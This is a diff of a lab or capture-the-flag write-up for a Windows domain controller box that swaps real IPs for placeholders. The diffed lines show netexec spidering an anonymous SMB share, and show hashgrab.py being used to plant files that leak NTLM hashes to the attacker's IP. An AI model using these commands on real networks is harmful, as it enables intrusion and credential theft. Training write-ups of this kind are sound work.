@@ -111,7 +111,7 @@ echo '<your-box-ip> hack.smarter DC01.hack.smarter' | sudo tee -a /etc/hosts
 We have anonymous read and write access to the SMB share named 'Share'.
 
 ```
-nxc smb 10.0.21.103 -u 'anonymous' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
+nxc smb <your-box-ip> -u 'anonymous' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
 ```
 
 ![](img/2.png)
@@ -128,7 +128,7 @@ wget https://raw.githubusercontent.com/xct/hashgrab/refs/heads/main/hashgrab.py
 First, we create the files using our `tun0` IP address and a file name.
 
 ```
-python hashgrab.py <your-ip> Raises_Q4
+python hashgrab.py <your-tun0-ip> Raises_Q4
 ```
 
 ![](img/4.png)
